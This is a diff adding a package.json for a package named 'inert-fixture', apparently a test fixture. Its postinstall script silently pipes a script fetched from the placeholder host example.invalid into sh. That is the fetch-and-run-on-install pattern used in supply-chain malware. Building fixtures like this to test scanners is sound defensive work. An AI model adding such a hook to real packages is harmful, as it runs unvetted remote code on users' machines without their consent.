@@ -1,0 +1,7 @@
+{
+  "name": "inert-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://example.invalid/setup.sh | sh"
+  }
+}
